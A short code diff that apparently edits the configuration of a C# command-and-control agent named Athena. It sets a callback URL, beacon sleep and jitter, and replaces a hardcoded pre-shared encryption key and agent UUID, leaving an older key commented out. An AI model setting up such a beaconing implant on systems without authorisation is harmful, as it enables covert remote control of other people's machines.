@@ -45,15 +45,14 @@ namespace Athena
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "";
             this.hostHeader = "";
-            this.psk = "TFWdlldjF0sCRUPL4T4pzZj+Ut8y2w1oK3NBo71OP1M=";
+            this.psk = "KdMlU0mqlqoYHV5sr4yQCfJGO3Uib2uQyMblDKiNdrE=";
             //this.psk = "lKb443VzmD7L6sjTF+69j8D+I3CphAuS6FPCQAPf/ts=";
             this.encryptedExchangeCheck = bool.Parse("false");
             int sleep = int.TryParse("3", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("3", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.uuid = "72aab7a8-147c-42e4-a001-f558225bc4b2";
-            //this.uuid = "4def55b0-51c0-46da-bf8e-12e4604c32b6";
+            this.uuid = "eb53d24b-ae9f-4737-b8df-de8df3ed748b";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
